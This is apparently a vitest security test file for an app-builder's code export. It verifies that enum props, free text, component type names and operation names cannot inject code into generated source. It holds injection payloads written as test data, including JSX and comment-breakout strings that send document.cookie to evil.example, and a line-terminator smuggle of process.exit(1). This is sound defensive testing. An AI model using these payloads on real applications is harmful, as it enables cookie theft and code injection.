/**
 * ADR 0835 D2 — the code-export exit never emits an unchecked design value.
 *
 * Every delivery path (ZIP export, GitHub publish, two-way sync push) goes
 * through `generateScrubbed`, so that is where these legs probe. The sweep is
 * driven by the LIVE component catalog, not a hand-kept list: a prop added to
 * the catalog tomorrow is covered without editing this file.
 *
 *  - S2: an enum prop outside its options used to reach `class="…"` / `$size="…"`
 *    through the non-escaping `str()`, so `md" onClick={…} x="` became live JSX.
 *    Oracle: a hostile enum value exports BYTE-IDENTICAL to the declared default.
 *  - Free-text props, screen names and the app name: a marker carrying every
 *    character some target's escaper rewrites must never appear raw in source.
 *    (`*.md` is excluded — prose, never compiled or executed.)
 *  - S10: an operation name lands in a `//` comment in the generated server;
 *    a line terminator in it must not end the comment.
 */
import { describe, expect, it, beforeAll } from 'vitest';
import { generateScrubbed } from '../src/features/app-builder/export/exportService.js';
import { EXPORT_TARGETS, type ExportTarget } from '../src/features/app-builder/export/generators.js';
import { APP_BUILDER_COMPONENTS, registerAppBuilderComponents } from '../src/features/app-builder/componentCatalog.js';

beforeAll(() => { registerAppBuilderComponents(); });

const HOSTILE_ENUM = 'md" onClick={() => fetch("https://evil.example/" + document.cookie)} x="';
const LINE_TERMINATORS = new RegExp('\\r\\n|[\\n\\r\\u2028\\u2029]');
const MARK = 'Zq"\'<>{}$';

function appWith(node: Record<string, unknown>, extra: Record<string, unknown> = {}): Record<string, unknown> {
  return { name: 'Probe', screens: [{ id: 'home', name: 'Home', isInitial: true, components: [node] }], ...extra };
}

function sourceFiles(state: unknown, target: ExportTarget): { path: string; content: string }[] {
  return generateScrubbed(state, target).files.filter((f) => !f.path.endsWith('.md'));
}

describe('ADR 0835 D2 — enum props are coerced at the export exit (S2)', () => {
  const cases = APP_BUILDER_COMPONENTS.flatMap((c) => (c.props ?? []).filter((p) => p.type === 'enum').map((p) => ({ component: c.type, prop: p.name, def: p.default })));

  it('the catalog has enum props to sweep (a vacuous sweep would pass)', () => {
    expect(cases.length).toBeGreaterThan(20);
  });

  for (const target of EXPORT_TARGETS) {
    it(`${target}: every hostile enum value exports exactly like its default`, () => {
      const leaks: string[] = [];
      for (const { component, prop, def } of cases) {
        const baseProps = def === undefined ? {} : { [prop]: def };
        const base = sourceFiles(appWith({ type: component, props: baseProps }), target);
        const hostile = sourceFiles(appWith({ type: component, props: { [prop]: HOSTILE_ENUM } }), target);
        if (JSON.stringify(base) !== JSON.stringify(hostile)) leaks.push(`${component}.${prop}`);
      }
      expect(leaks, `enum props that changed the output when given a hostile value (${target})`).toEqual([]);
    });
  }

  it('says what it coerced (catalog violations stay warnings, never silent)', () => {
    const { warnings } = generateScrubbed(appWith({ type: 'text', props: { text: 'x', fontSize: HOSTILE_ENUM } }), 'html-css');
    expect(warnings.some((w) => w.includes('text.fontSize'))).toBe(true);
  });
});

describe('ADR 0835 D2 — free text never reaches source unescaped', () => {
  const textProps = APP_BUILDER_COMPONENTS.flatMap((c) => (c.props ?? []).filter((p) => p.type === 'string' || p.type === 'longtext' || p.type === 'stringlist').map((p) => ({ component: c.type, prop: p.name })));

  for (const target of EXPORT_TARGETS) {
    it(`${target}: no free-text prop, screen name or app name appears raw`, () => {
      const leaks: string[] = [];
      for (const { component, prop } of textProps) {
        for (const f of sourceFiles(appWith({ type: component, props: { [prop]: MARK } }), target)) {
          if (f.content.includes(MARK)) leaks.push(`${component}.${prop} → ${f.path}`);
        }
      }
      const named = { name: MARK, description: MARK, screens: [{ id: 'home', name: MARK, isInitial: true, components: [] }] };
      for (const f of sourceFiles(named, target)) if (f.content.includes(MARK)) leaks.push(`app/screen name → ${f.path}`);
      expect(leaks).toEqual([]);
    });
  }
});

describe('ADR 0835 AB2-CD-1 — an unknown component type stays inside its "unsupported" comment', () => {
  // The inline export lets an unknown type through by contract (it becomes a
  // warning), so the type string is author/model text reaching a comment.
  const TYPE = 'W*/fetch(`//evil.example/`+document.cookie)/*-->';
  for (const target of EXPORT_TARGETS) {
    it(`${target}: the type cannot close the comment`, () => {
      for (const f of sourceFiles(appWith({ type: TYPE, props: {} }), target)) {
        expect(f.content.includes('*/fetch') || f.content.includes('-->fetch') || f.content.includes('`//evil'), f.path).toBe(false);
      }
    });
  }
});

describe('ADR 0835 D2 — the generated backend keeps operation names inside their comment (S10)', () => {
  for (const term of ['\n', '\r', '\u2028', '\u2029']) {
    it(`a ${JSON.stringify(term)} in an operation name does not become code`, () => {
      const state = appWith({ type: 'text', props: { text: 'x' } }, {
        models: [{ id: 'Todo', name: 'Todo', fields: [{ name: 'title', type: 'string' }] }],
        operations: [{ id: 'listTodos', name: `List${term}process.exit(1);//`, kind: 'list', modelId: 'Todo' }],
      });
      const backend = generateScrubbed(state, 'react-tailwind').files.filter((f) => f.path.startsWith('backend/'));
      expect(backend.length).toBeGreaterThan(0);
      for (const f of backend) {
        expect(f.content.split(LINE_TERMINATORS).some((l) => l.trimStart().startsWith('process.exit(1)')), f.path).toBe(false);
      }
    });
  }
});

describe('ADR 0835 AB2-CD-10 — prototype keys in the data model never crash an export', () => {
  it('a `constructor` field type / `toString` op kind exports (as the defaults) instead of a 500', () => {
    const state = appWith({ type: 'text', props: { text: 'x' } }, {
      models: [{ id: 'Todo', name: 'Todo', fields: [{ name: 'title', type: 'constructor' }] }],
      operations: [{ id: 'listTodos', name: 'List', kind: 'toString', modelId: 'Todo', input: [{ name: 'q', type: '__proto__' }] }],
    });
    for (const target of EXPORT_TARGETS) expect(() => generateScrubbed(state, target), target).not.toThrow();
  });
});
